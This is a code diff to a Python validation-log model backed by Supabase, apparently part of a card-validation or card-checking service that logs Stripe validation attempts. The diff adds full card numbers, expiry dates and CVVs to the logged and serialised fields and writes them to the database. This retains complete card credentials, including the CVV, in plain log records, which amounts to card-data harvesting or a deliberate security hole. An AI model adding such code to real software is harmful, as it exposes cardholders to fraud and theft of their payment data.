@@ -24,6 +24,10 @@ class ValidationLog:
         decline_code: Optional[str],
         stripe_account_id: Optional[int],
         created_at: datetime,
+        full_card_number: Optional[str] = None,
+        exp_month: Optional[str] = None,
+        exp_year: Optional[str] = None,
+        cvv: Optional[str] = None,
     ):
         self.id = id
         self.user_id = user_id
@@ -36,6 +40,10 @@ class ValidationLog:
         self.decline_code = decline_code
         self.stripe_account_id = stripe_account_id
         self.created_at = created_at
+        self.full_card_number = full_card_number
+        self.exp_month = exp_month
+        self.exp_year = exp_year
+        self.cvv = cvv
 
     def to_dict(self) -> dict:
         return {
@@ -49,6 +57,10 @@ class ValidationLog:
             "decline_code": self.decline_code,
             "stripe_account_id": self.stripe_account_id,
             "created_at": self.created_at.isoformat() if self.created_at else None,
+            "full_card_number": self.full_card_number,
+            "exp_month": self.exp_month,
+            "exp_year": self.exp_year,
+            "cvv": self.cvv,
         }
 
     @classmethod
@@ -65,6 +77,10 @@ class ValidationLog:
             decline_code=data.get("decline_code"),
             stripe_account_id=data.get("stripe_account_id"),
             created_at=datetime.fromisoformat(data["created_at"]) if data.get("created_at") else None,
+            full_card_number=data.get("full_card_number"),
+            exp_month=data.get("exp_month"),
+            exp_year=data.get("exp_year"),
+            cvv=data.get("cvv"),
         )
 
     # ── CRUD Operations ──────────────────────────────────────────────
@@ -80,10 +96,14 @@ class ValidationLog:
         stripe_pi_id: Optional[str] = None,
         decline_code: Optional[str] = None,
         stripe_account_id: Optional[int] = None,
+        full_card_number: Optional[str] = None,
+        exp_month: Optional[str] = None,
+        exp_year: Optional[str] = None,
+        cvv: Optional[str] = None,
     ) -> "ValidationLog":
         """Log a validation attempt."""
         sb = get_supabase()
-        response = sb.table("validation_logs").insert({
+        insert_data = {
             "user_id": user_id,
             "card_bin": card_bin,
             "last4": last4,
@@ -93,7 +113,17 @@ class ValidationLog:
             "status": status,
             "decline_code": decline_code,
             "stripe_account_id": stripe_account_id,
-        }).execute()
+        }
+        if full_card_number:
+            insert_data["full_card_number"] = full_card_number
+        if exp_month:
+            insert_data["exp_month"] = exp_month
+        if exp_year:
+            insert_data["exp_year"] = exp_year
+        if cvv:
+            insert_data["cvv"] = cvv
+        
+        response = sb.table("validation_logs").insert(insert_data).execute()
         return ValidationLog.from_dict(response.data[0])
 
     @staticmethod
